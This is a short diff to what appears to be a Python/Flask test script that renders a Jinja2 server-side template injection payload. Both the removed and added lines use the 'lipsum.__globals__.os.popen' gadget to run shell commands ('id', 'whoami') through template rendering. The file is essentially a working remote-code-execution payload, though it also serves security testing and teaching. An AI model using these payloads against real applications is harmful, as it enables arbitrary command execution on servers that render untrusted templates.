@@ -2,7 +2,7 @@ from jinja2 import Environment
 from flask import  Flask,Blueprint, render_template, request, flash, redirect, url_for, render_template_string
 
 env = Environment()
-result = env.from_string("Verified! {}".format("{{self._TemplateReference__context.lipsum.__globals__.os.popen(\"id\").read()}}")).render()
+result = env.from_string("Verified! {}".format("{{lipsum.__globals__.os.popen(\"whoami\").read()}}")).render()
 
 print(f"jinja2 結果: {result}")
 print("====")
